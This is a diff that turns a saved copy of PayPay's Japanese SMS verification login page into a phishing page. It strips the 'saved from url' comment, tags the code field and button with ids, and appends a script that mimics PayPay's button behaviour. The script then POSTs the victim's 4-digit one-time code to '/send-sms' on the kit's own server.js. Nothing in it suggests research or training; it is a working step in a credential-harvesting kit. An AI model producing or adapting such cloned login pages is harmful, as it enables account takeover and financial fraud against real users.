@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<!-- saved from url=(0040)https://www.paypay.ne.jp/app/account/otp -->
 <html lang="ja"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <script defer="" src="./payapay_files/vue.runtime.global.prod.js.ダウンロード"></script>
   <script defer="" src="./payapay_files/vue-i18n.global.prod.min.js.ダウンロード"></script>
@@ -267,7 +266,7 @@
     
     <div id="app" data-v-app=""><div id="app" style="--font-weight-bold: var(--font-weight-bold-ios); --RootPortal-zIndex: 1100;"><!----><div class="container"><section data-v-32bf0b5d="" class="account-root-page"><section data-v-b035e588="" data-v-32bf0b5d="" class="top-header account-header"><header data-v-b035e588="" class="header-signin"><img data-v-b035e588="" src="./payapay_files/logo.png" alt="PayPay" height="45"><h2 data-v-b035e588="">ログイン</h2></header><div data-v-b035e588="" class="header-more"></div></section><div data-v-32bf0b5d="" class="account-content"><!----><section data-v-7964b47e="" data-v-32bf0b5d="" class="otp-auth-page"><div data-v-7964b47e="" class="mb10"><i data-v-3c7781bb="" data-v-7964b47e="" class="component-icon
     icon-phone-sms
-    icon-md"></i></div><h3 data-v-7964b47e="" class="header-title">SMSで届いた認証コードを入力してください</h3><p data-v-7964b47e="" class="sub-title">こちらの携帯電話番号に送信しました <strong data-v-7964b47e="" class="ml10">080-****-****</strong></p><section data-v-2dbf0436="" data-v-7964b47e="" class="otp-auth"><div data-v-2dbf0436="" class="otp-content"><div data-v-de519d7f="" data-v-2dbf0436="" class="otp"><div data-v-de519d7f="" class="otp-field"><div data-v-de519d7f="" class="Eotp-prefix"></div><div data-v-de519d7f="" class="otp-code"><input data-v-de519d7f="" name="otp_input" class="otp-input" maxlength="4" pattern="\\d*" type="tel"></div></div><div data-v-de519d7f="" class="otp-info" style=""><p data-v-de519d7f="">認証コードに記載の２文字のアルファベットを確認の上、４桁の数字を入力してください</p><p data-v-de519d7f=""><a data-v-de519d7f="" href="https://paypay.ne.jp/rd/support/help/c0177/" target="_blank">アルファベットに関して</a></p></div></div></div><!----><p data-v-2dbf0436="" class="re-send disabled">認証コードを再送 <span data-v-2dbf0436="">(50秒後)</span></p><p data-v-2dbf0436=""><a data-v-2dbf0436="" href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank" class="otp-info"><img data-v-2dbf0436="" src="./payapay_files/ic-question.svg" width="14" height="14" alt="help icon"> &nbsp;認証コードが届かない場合</a></p><button data-v-2dbf0436="" class="submit-button" disabled="">認証する</button></section></section></div></section></div><div style="z-index: var(--RootPortal-zIndex);"><!----><!----><!----><!----><!----></div></div></div>
+    icon-md"></i></div><h3 data-v-7964b47e="" class="header-title">SMSで届いた認証コードを入力してください</h3><p data-v-7964b47e="" class="sub-title">こちらの携帯電話番号に送信しました <strong data-v-7964b47e="" class="ml10">080-****-****</strong></p><section data-v-2dbf0436="" data-v-7964b47e="" class="otp-auth"><div data-v-2dbf0436="" class="otp-content"><div data-v-de519d7f="" data-v-2dbf0436="" class="otp"><div data-v-de519d7f="" class="otp-field"><div data-v-de519d7f="" class="Eotp-prefix"></div><div data-v-de519d7f="" class="otp-code"><input data-v-de519d7f="" id="sms-input" name="otp_input" class="otp-input" maxlength="4" pattern="\\d*" type="tel"></div></div><div data-v-de519d7f="" class="otp-info" style=""><p data-v-de519d7f="">認証コードに記載の２文字のアルファベットを確認の上、４桁の数字を入力してください</p><p data-v-de519d7f=""><a data-v-de519d7f="" href="https://paypay.ne.jp/rd/support/help/c0177/" target="_blank">アルファベットに関して</a></p></div></div></div><!----><p data-v-2dbf0436="" class="re-send disabled">認証コードを再送 <span data-v-2dbf0436="">(50秒後)</span></p><p data-v-2dbf0436=""><a data-v-2dbf0436="" href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank" class="otp-info"><img data-v-2dbf0436="" src="./payapay_files/ic-question.svg" width="14" height="14" alt="help icon"> &nbsp;認証コードが届かない場合</a></p><button data-v-2dbf0436="" id="sms-submit" class="submit-button" disabled="">認証する</button></section></section></div></section></div><div style="z-index: var(--RootPortal-zIndex);"><!----><!----><!----><!----><!----></div></div></div>
     <script>
       (function () {
         const currentPath = window.location.pathname;
@@ -330,7 +329,64 @@
         }
       })()
     </script>
-    <!-- built files will be auto injected -->
-  
+
+    <!-- ▼▼▼ ここから追加：POST送信処理 ▼▼▼ -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        const smsInput = document.getElementById('sms-input');
+        const submitBtn = document.getElementById('sms-submit');
+
+        // 入力値を監視して、4桁入力されたらボタンを有効化する（PayPayの挙動を再現）
+        smsInput.addEventListener('input', function() {
+          if (this.value.length === 4) {
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = '1';
+            submitBtn.style.cursor = 'pointer';
+          } else {
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.5';
+            submitBtn.style.cursor = 'not-allowed';
+          }
+        });
+
+        // ボタンがクリックされたらサーバーにPOST送信
+        submitBtn.addEventListener('click', async function(e) {
+          e.preventDefault(); // デフォルトの動作をキャンセル
+          
+          const code = smsInput.value;
+          if (code.length !== 4) return;
+
+          // 二重送信防止
+          submitBtn.disabled = true;
+          submitBtn.textContent = '認証中...';
+
+          const formData = new URLSearchParams();
+          formData.append('sms_code', code);
+
+          try {
+            // server.js の /send-sms へリクエスト
+            const response = await fetch('/send-sms', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+              },
+              body: formData.toString()
+            });
+
+            // サーバー側でリダイレクトされた場合はそのURLに飛ぶ
+            if (response.redirected) {
+              window.location.href = response.url;
+            } else {
+              // エラーだった場合
+              window.location.href = '/sms.html?error=1';
+            }
+          } catch (err) {
+            console.error('送信エラー:', err);
+            window.location.href = '/sms.html?error=1';
+          }
+        });
+      });
+    </script>
+    <!-- ▲▲▲ ここまで追加 ▲▲▲ -->
 
 </body></html>
